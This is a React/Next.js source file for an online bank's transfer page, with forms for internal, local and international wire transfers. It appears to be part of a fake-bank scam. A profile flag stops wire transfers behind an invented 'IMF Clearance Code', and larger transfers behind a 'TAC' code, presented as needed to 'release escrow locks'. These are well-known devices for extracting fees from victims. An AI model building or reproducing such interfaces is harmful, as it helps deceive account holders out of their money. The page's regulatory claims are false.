'use client';

import React, { useEffect, useState } from 'react';
import { Landmark, ArrowRightLeft, HelpCircle, AlertCircle, CheckCircle2, ShieldCheck, Mail } from 'lucide-react';
import confetti from 'canvas-confetti';

export default function Transfer() {
  const [profile, setProfile] = useState<any>(null);
  const [accounts, setAccounts] = useState<any[]>([]);
  const [transferType, setTransferType] = useState<'internal' | 'local' | 'wire'>('internal');
  
  // Form fields
  const [currency, setCurrency] = useState('USD');
  const [amount, setAmount] = useState('');
  const [receiverAccountNumber, setReceiverAccountNumber] = useState('');
  const [receiverName, setReceiverName] = useState('');
  const [receiverBank, setReceiverBank] = useState('');
  const [swiftCode, setSwiftCode] = useState('');
  const [routineNumber, setRoutineNumber] = useState('');
  const [receiverAddress, setReceiverAddress] = useState('');
  
  // State
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [successMsg, setSuccessMsg] = useState('');

  // Security code prompt modal state
  const [showCodeModal, setShowCodeModal] = useState(false);
  const [codeType, setCodeType] = useState<'TAC' | 'IMF' | 'TAX' | null>(null);
  const [codeValue, setCodeValue] = useState('');
  const [modalError, setModalError] = useState('');
  const [modalLoading, setModalLoading] = useState(false);
  const [codeRequested, setCodeRequested] = useState(false);

  const fetchTransferData = async () => {
    try {
      const token = localStorage.getItem('token');
      const apiUrl = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:5001/api';

      const profileRes = await fetch(`${apiUrl}/user/profile`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      const profileData = await profileRes.json();
      setProfile(profileData);

      const accountsRes = await fetch(`${apiUrl}/user/accounts`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      const accountsData = await accountsRes.json();
      setAccounts(accountsData);
      if (accountsData.length > 0) {
        setCurrency(accountsData[0].currency);
      }
    } catch (e) {
      console.error('Error fetching data:', e);
    }
  };

  useEffect(() => {
    fetchTransferData();
  }, []);

  // Trigger security checks when submitting main transfer form
  const handleInitiateTransfer = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setSuccessMsg('');

    const parsedAmount = parseFloat(amount);
    if (isNaN(parsedAmount) || parsedAmount <= 0) {
      setError('Please enter a valid amount.');
      return;
    }

    const selectedAccount = accounts.find((a) => a.currency === currency);
    if (!selectedAccount || selectedAccount.balance < parsedAmount) {
      setError('Insufficient funds in the selected currency.');
      return;
    }

    // Determine if security codes are required based on profile flags and transaction type
    // If the transfer is wire or larger than 10,000, trigger IMF/TAC clearance
    if (transferType === 'wire' && profile?.onReview) {
      // Prompt for IMF Clearance Code
      setCodeType('IMF');
      setShowCodeModal(true);
    } else if (parsedAmount >= 5000) {
      // Prompt for TAC Code
      setCodeType('TAC');
      setShowCodeModal(true);
    } else {
      // Proceed directly
      executeTransfer();
    }
  };

  // Trigger Request Code API
  const handleRequestCode = async () => {
    if (!codeType) return;
    setModalError('');
    setModalLoading(true);
    try {
      const token = localStorage.getItem('token');
      const apiUrl = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:5001/api';

      const response = await fetch(`${apiUrl}/user/request-code`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({ type: codeType }),
      });

      const data = await response.json();
      if (!response.ok) {
        throw new Error(data.message || 'Failed to request clearance code');
      }

      setCodeRequested(true);
    } catch (err: any) {
      setModalError(err.message || 'Error requesting code');
    } finally {
      setModalLoading(false);
    }
  };

  // Submit verified transfer with clearance code (or directly)
  const executeTransfer = async (verifiedCodeType?: string, verifiedCodeValue?: string) => {
    setLoading(true);
    setError('');
    setModalError('');
    try {
      const token = localStorage.getItem('token');
      const apiUrl = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:5001/api';

      const response = await fetch(`${apiUrl}/user/transfer`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          type: transferType,
          amount,
          currency,
          receiverAccountNumber,
          receiverName,
          receiverBank,
          swiftCode,
          routineNumber,
          receiverAddress,
          codeType: verifiedCodeType || '',
          codeValue: verifiedCodeValue || '',
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        if (data.codeError) {
          // If code was wrong/required, trigger modal error
          if (showCodeModal) {
            setModalError(data.message || 'Clearance code verification failed.');
          } else {
            setCodeType(data.codeError);
            setShowCodeModal(true);
            setModalError(data.message);
          }
          return;
        }
        throw new Error(data.message || 'Transfer transaction failed');
      }

      // Success
      setSuccessMsg(data.message || 'Transfer completed successfully.');
      confetti({
        particleCount: 150,
        spread: 80,
        origin: { y: 0.6 },
        colors: ['#e53e3e', '#121824', '#ffffff'],
      });

      // Reset form
      setAmount('');
      setReceiverAccountNumber('');
      setReceiverName('');
      setReceiverBank('');
      setSwiftCode('');
      setRoutineNumber('');
      setReceiverAddress('');
      setShowCodeModal(false);
      setCodeType(null);
      setCodeValue('');
      setCodeRequested(false);

      // Re-fetch balances
      fetchTransferData();
    } catch (err: any) {
      setError(err.message || 'An error occurred during transfer.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="flex flex-col gap-8 relative">
      
      {/* Page Title */}
      <div className="flex flex-col gap-1">
        <h2 className="text-xl font-extrabold text-slate-900 uppercase tracking-tight">Dispatch Funds</h2>
        <p className="text-slate-400 text-xs font-light">Perform internal ledger transactions or outbound wire transfers.</p>
      </div>

      {error && (
        <div className="bg-red-50 border border-red-200 text-red-800 p-4 rounded-xl text-xs flex gap-2.5 items-start">
          <AlertCircle size={18} className="flex-shrink-0 mt-0.5" />
          <span>{error}</span>
        </div>
      )}

      {successMsg && (
        <div className="bg-emerald-50 border border-emerald-200 text-emerald-800 p-5 rounded-xl text-xs sm:text-sm flex gap-3 items-start">
          <CheckCircle2 size={22} className="text-emerald-600 flex-shrink-0 mt-0.5" />
          <div>
            <h4 className="font-bold">Transaction Dispatched Successfully!</h4>
            <p className="text-xs text-emerald-700 font-light mt-0.5">{successMsg}</p>
          </div>
        </div>
      )}

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
        
        {/* Main form */}
        <div className="lg:col-span-8 bg-white p-6 sm:p-8 rounded-2xl border border-slate-200 shadow-sm flex flex-col gap-6">
          
          {/* Transfer Type Selector */}
          <div className="flex bg-slate-50 border border-slate-100 p-1.5 rounded-xl text-xs font-bold gap-1">
            <button
              onClick={() => {
                setTransferType('internal');
                setError('');
              }}
              className={`flex-1 py-3 text-center rounded-lg cursor-pointer transition-all ${
                transferType === 'internal' ? 'bg-secondary text-white shadow-sm' : 'text-slate-500 hover:text-slate-800'
              }`}
            >
              Internal Transfer
            </button>
            <button
              onClick={() => {
                setTransferType('local');
                setError('');
              }}
              className={`flex-1 py-3 text-center rounded-lg cursor-pointer transition-all ${
                transferType === 'local' ? 'bg-secondary text-white shadow-sm' : 'text-slate-500 hover:text-slate-800'
              }`}
            >
              Local Bank Transfer
            </button>
            <button
              onClick={() => {
                setTransferType('wire');
                setError('');
              }}
              className={`flex-1 py-3 text-center rounded-lg cursor-pointer transition-all ${
                transferType === 'wire' ? 'bg-secondary text-white shadow-sm' : 'text-slate-500 hover:text-slate-800'
              }`}
            >
              International Wire
            </button>
          </div>

          <form onSubmit={handleInitiateTransfer} className="flex flex-col gap-5">
            
            {/* Account Selector & Amount */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-5">
              <div className="flex flex-col gap-1.5">
                <label className="text-xs font-bold text-slate-600">Select Wallet / Currency</label>
                <select
                  value={currency}
                  onChange={(e) => setCurrency(e.target.value)}
                  className="w-full border border-slate-200 rounded px-4 py-3 text-sm focus:outline-none focus:ring-1 focus:ring-primary focus:border-primary bg-slate-50"
                >
                  {accounts.map((a) => (
                    <option key={a._id} value={a.currency}>
                      {a.currency} - Balance: {a.symbol}{a.balance.toLocaleString()}
                    </option>
                  ))}
                </select>
              </div>

              <div className="flex flex-col gap-1.5">
                <label className="text-xs font-bold text-slate-600">Transfer Amount</label>
                <input
                  type="number"
                  step="0.01"
                  required
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="0.00"
                  className="w-full border border-slate-200 rounded px-4 py-3 text-sm focus:outline-none focus:ring-1 focus:ring-primary focus:border-primary bg-slate-50 font-mono font-semibold"
                />
              </div>
            </div>

            {/* Recipient Account Details */}
            <div className="border-t border-slate-100 pt-5 flex flex-col gap-5">
              <h3 className="font-bold text-slate-900 text-sm uppercase tracking-wide">
                Beneficiary Details
              </h3>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-5">
                <div className="flex flex-col gap-1.5">
                  <label className="text-xs font-bold text-slate-600">
                    {transferType === 'internal' ? 'Recipient Account Number or Username' : 'Recipient Account Number / IBAN'}
                  </label>
                  <input
                    type="text"
                    required
                    value={receiverAccountNumber}
                    onChange={(e) => setReceiverAccountNumber(e.target.value)}
                    placeholder="Enter digits/username"
                    className="w-full border border-slate-200 rounded px-4 py-3 text-sm focus:outline-none focus:ring-1 focus:ring-primary focus:border-primary bg-slate-50 font-mono"
                  />
                </div>

                {transferType !== 'internal' && (
                  <div className="flex flex-col gap-1.5">
                    <label className="text-xs font-bold text-slate-600">Recipient Account Name</label>
                    <input
                      type="text"
                      required
                      value={receiverName}
                      onChange={(e) => setReceiverName(e.target.value)}
                      placeholder="Beneficiary Full Name"
                      className="w-full border border-slate-200 rounded px-4 py-3 text-sm focus:outline-none focus:ring-1 focus:ring-primary focus:border-primary bg-slate-50"
                    />
                  </div>
                )}
              </div>

              {transferType !== 'internal' && (
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-5">
                  <div className="flex flex-col gap-1.5">
                    <label className="text-xs font-bold text-slate-600">Recipient Bank Name</label>
                    <input
                      type="text"
                      required
                      value={receiverBank}
                      onChange={(e) => setReceiverBank(e.target.value)}
                      placeholder="e.g. Bank of America"
                      className="w-full border border-slate-200 rounded px-4 py-3 text-sm focus:outline-none focus:ring-1 focus:ring-primary focus:border-primary bg-slate-50"
                    />
                  </div>
                  <div className="flex flex-col gap-1.5">
                    <label className="text-xs font-bold text-slate-600">SWIFT / BIC Code</label>
                    <input
                      type="text"
                      required
                      value={swiftCode}
                      onChange={(e) => setSwiftCode(e.target.value)}
                      placeholder="e.g. BOFAUS3NXXX"
                      className="w-full border border-slate-200 rounded px-4 py-3 text-sm focus:outline-none focus:ring-1 focus:ring-primary focus:border-primary bg-slate-50 font-mono"
                    />
                  </div>
                </div>
              )}

              {transferType === 'wire' && (
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-5">
                  <div className="flex flex-col gap-1.5">
                    <label className="text-xs font-bold text-slate-600">Routing Number / Sort Code</label>
                    <input
                      type="text"
                      required
                      value={routineNumber}
                      onChange={(e) => setRoutineNumber(e.target.value)}
                      placeholder="9-digit routing"
                      className="w-full border border-slate-200 rounded px-4 py-3 text-sm focus:outline-none focus:ring-1 focus:ring-primary focus:border-primary bg-slate-50 font-mono"
                    />
                  </div>
                  <div className="flex flex-col gap-1.5">
                    <label className="text-xs font-bold text-slate-600">Recipient Home/Bank Address</label>
                    <input
                      type="text"
                      required
                      value={receiverAddress}
                      onChange={(e) => setReceiverAddress(e.target.value)}
                      placeholder="Beneficiary Address"
                      className="w-full border border-slate-200 rounded px-4 py-3 text-sm focus:outline-none focus:ring-1 focus:ring-primary focus:border-primary bg-slate-50"
                    />
                  </div>
                </div>
              )}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="bg-primary text-white font-bold py-4 rounded hover:bg-primary-hover shadow-md hover:shadow-lg transition-all flex items-center justify-center gap-2 text-sm disabled:bg-slate-400 disabled:cursor-not-allowed mt-4 cursor-pointer"
            >
              {loading ? <span>Clearing transaction ledgers...</span> : (
                <>
                  <span>Clear & Dispatch Funds</span>
                  <ArrowRightLeft size={16} />
                </>
              )}
            </button>

          </form>

        </div>

        {/* Informative Side Cards */}
        <div className="lg:col-span-4 flex flex-col gap-6">
          
          <div className="bg-slate-900 text-white p-6 rounded-2xl border border-slate-800 shadow-md flex flex-col gap-4">
            <h4 className="font-bold text-sm uppercase tracking-wider text-primary">Clearance Notes</h4>
            <ul className="text-xs font-light text-slate-300 flex flex-col gap-3 leading-relaxed">
              <li className="flex gap-2">
                <span className="text-primary font-bold">•</span>
                <span><b>Internal Transfers:</b> Instantly debited and credited to receiving client wallets.</span>
              </li>
              <li className="flex gap-2">
                <span className="text-primary font-bold">•</span>
                <span><b>Outbound Clearance:</b> External local and wire transfers are queued in security audit. Approval happens within 1-2 banking hours.</span>
              </li>
              <li className="flex gap-2">
                <span className="text-primary font-bold">•</span>
                <span><b>Security Locks:</b> Large transactions may require temporary TAC or IMF codes to release escrow locks.</span>
              </li>
            </ul>
          </div>

          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm flex gap-4 items-start">
            <HelpCircle size={20} className="text-primary flex-shrink-0 mt-0.5" />
            <div>
              <h4 className="font-bold text-slate-800 text-sm mb-1">Need a Security Code?</h4>
              <p className="text-xs font-light text-slate-500 leading-relaxed">
                If your account triggers compliance codes, submit the transaction to reveal the prompt. Click "Request Code" in the clearance window to receive the code via email.
              </p>
            </div>
          </div>

        </div>

      </div>

      {/* 4. Security Verification Code Prompt Modal */}
      {showCodeModal && (
        <div className="fixed inset-0 bg-black/60 flex items-center justify-center p-4 z-50 animate-fadeIn">
          <div className="bg-white p-6 sm:p-8 rounded-2xl border border-slate-200 shadow-2xl max-w-md w-full flex flex-col gap-6 relative">
            
            {/* Modal Header */}
            <div className="flex flex-col items-center gap-3 text-center">
              <div className="p-3 bg-red-50 text-primary rounded-full animate-bounce">
                <ShieldCheck size={32} />
              </div>
              <h3 className="font-extrabold text-slate-900 text-lg sm:text-xl uppercase tracking-tight">
                {codeType === 'TAC' ? 'Compliance Code Required' : 'International Clearance Required'}
              </h3>
              <p className="text-xs font-light text-slate-500 leading-relaxed">
                {codeType === 'TAC' 
                  ? 'Your transaction requires a 5-digit Transaction Authorization Code (TAC) to clear escrow transit locks.'
                  : 'Your international wire transfer requires an IMF Clearance clearance code for regulatory dispatch.'
                }
              </p>
            </div>

            {/* Modal error */}
            {modalError && (
              <div className="bg-red-50 border border-red-200 text-red-800 p-3 rounded-lg text-xs flex gap-2 items-center">
                <AlertCircle size={16} className="flex-shrink-0" />
                <span>{modalError}</span>
              </div>
            )}

            {/* Code request success notification */}
            {codeRequested && (
              <div className="bg-emerald-50 border border-emerald-200 text-emerald-800 p-3 rounded-lg text-xs flex gap-2 items-center">
                <Mail size={16} className="flex-shrink-0 text-emerald-600" />
                <span>Clearance code successfully sent to your email.</span>
              </div>
            )}

            {/* Code submission form */}
            <div className="flex flex-col gap-4">
              <input
                type="text"
                required
                maxLength={10}
                value={codeValue}
                onChange={(e) => setCodeValue(e.target.value)}
                placeholder={codeType === 'TAC' ? 'Enter 5-digit TAC code' : 'Enter IMF code'}
                className="w-full border border-slate-200 rounded px-4 py-3 text-center text-sm font-mono font-bold tracking-widest focus:outline-none focus:ring-1 focus:ring-primary bg-slate-50"
              />

              <div className="flex gap-4">
                <button
                  onClick={handleRequestCode}
                  disabled={modalLoading}
                  className="flex-1 border border-slate-200 hover:bg-slate-50 font-bold py-3 rounded text-xs transition-colors cursor-pointer text-slate-700 disabled:bg-slate-100"
                >
                  {modalLoading ? 'Requesting...' : 'Request Code'}
                </button>
                
                <button
                  onClick={() => executeTransfer(codeType || '', codeValue)}
                  disabled={loading || !codeValue}
                  className="flex-1 bg-primary text-white font-bold py-3 rounded hover:bg-primary-hover shadow transition-colors text-xs disabled:bg-slate-400 cursor-pointer"
                >
                  {loading ? 'Clearing...' : 'Verify & Send'}
                </button>
              </div>

              <button
                onClick={() => {
                  setShowCodeModal(false);
                  setCodeType(null);
                  setCodeValue('');
                  setCodeRequested(false);
                  setModalError('');
                }}
                className="text-center text-xs text-slate-450 hover:text-primary transition-colors py-1 cursor-pointer"
              >
                Cancel Transfer
              </button>
            </div>

          </div>
        </div>
      )}

    </div>
  );
}
